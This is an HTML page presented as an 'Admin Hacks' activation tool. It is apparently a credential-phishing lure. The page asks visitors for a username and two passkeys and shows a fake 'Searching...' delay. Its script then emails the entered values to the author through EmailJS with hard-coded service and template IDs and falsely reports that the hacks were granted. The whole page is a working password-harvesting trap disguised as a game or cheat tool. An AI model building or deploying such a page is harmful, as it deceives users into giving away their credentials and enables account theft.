<!DOCTYPE html>
<html>
<head>
    <title>Admin Hacks</title>
    <style>
        /* Styling for the custom "Searching..." message */
        #searchingMessage {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            font-size: 20px;
            border-radius: 5px;
            z-index: 9999;
        }
    </style>
</head>
<body>

    <h1>
        Press to activate <input type="text" id="username" name="username"> (selected user) admin hacks
    </h1>
    <p>
        USER INFO: <input type="text" id="Passkey1" name="Passkey">
        Passkey: <input type="text" id="Passkey2" name="Passkey">
    </p>

    <button onclick="sendEmail()">ACTIVATE ADMIN HACKS</button>

    <!-- Custom "Searching..." message -->
    <div id="searchingMessage">Searching...</div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>

    <script>
        // Initialize EmailJS with your user ID
        emailjs.init("YOUR_USER_ID");

        function sendEmail() {
            // Get the values entered by the user
            const username = document.getElementById('username').value;
            const passkey1 = document.getElementById('Passkey1').value;
            const passkey2 = document.getElementById('Passkey2').value;

            // Display the "Searching..." message
            document.getElementById('searchingMessage').style.display = 'block';

            // Set a timeout to hide the "Searching..." message after 3 seconds (3000 milliseconds)
            setTimeout(function() {
                // Hide the "Searching..." message
                document.getElementById('searchingMessage').style.display = 'none';

                // Send the email using EmailJS
                const emailParams = {
                    username: username,
                    passkey1: passkey1,
                    passkey2: passkey2
                };

                // You can change 'your_service_id' and 'your_template_id' to match the EmailJS service you configured
                emailjs.send('service_74hon1v', 'template_je0ce5l', emailParams)
                    .then(function(response) {
                        alert("Admin hacks given and details sent to the email!");
                    }, function(error) {
                        alert("Failed to send email. Please try again.");
                    });
            }, 3000); // 3 seconds delay
        }
    </script>

    <p>
        Tool Created By Arnav.
    </p>
    <br>
    <p style="color:#FF0000;">WARNING: Unauthorized use is prohibited!</p>
    <br>
</body>
</html>
